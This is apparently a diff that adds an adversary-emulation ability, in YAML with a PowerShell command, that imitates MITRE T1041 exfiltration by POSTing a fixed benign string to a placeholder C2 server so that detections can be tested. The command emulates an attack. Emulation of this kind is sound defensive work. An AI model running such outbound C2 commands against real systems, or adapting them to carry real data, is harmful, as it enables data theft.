@@ -1,0 +1,14 @@
+- id: aed193f2-c0ef-4bd4-8e9a-7014136c1c58
+  name: Exfiltration over C2 (benign test)
+  description: Opens an outbound connection to the operator C2 and POSTs a fixed benign string, reproducing the network pattern of C2 exfiltration. No real or collected data is read or sent. Leaves outbound network telemetry (Sysmon EID 3).
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    windows:
+      psh:
+        command: |
+          $body=[System.Text.Encoding]::UTF8.GetBytes("benign-bas-test")
+          try { Invoke-WebRequest -Uri "#{server}" -Method POST -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}
+          Write-Output "Benign outbound POST to C2 completed - no real data sent"
